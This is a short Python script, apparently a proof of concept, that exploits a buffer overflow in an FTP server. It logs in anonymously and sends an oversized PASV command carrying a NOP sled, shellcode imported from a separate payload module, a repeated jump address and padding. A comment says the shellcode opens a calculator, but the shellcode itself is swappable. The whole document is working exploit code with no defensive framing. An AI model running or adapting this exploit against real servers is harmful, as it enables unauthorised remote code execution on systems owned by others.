import socket

from payload import buf

import struct
def shell_attack(target_machine, target_port):
    host = target_machine
    port = target_port
    jmp_eax = b'\xBF\x66\x02\x10'
    junk = b'\xCC\xCC\xCC\xCC'
    nop_sled = b'\x90\x90\x90' + b'\x90\x90\x90\x90' * 2
    # Calc shellcode by yours truly. Check the task manager
    # as the calc instance will not be visible.
    junk2 = b'A' * 7004
    bad_stuff = junk + nop_sled + buf + jmp_eax * 249 + junk2  
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(8)
    s.connect((host, port))
    s.send(b'USER anonymous\r\n')
    s.recv(8192)
    s.send(b'PASS x@x.com\r\n')
    s.recv(8192)
    s.send(b'PASV ' + bad_stuff + b'\r\n') 
    s.recv(8192)
    s.close()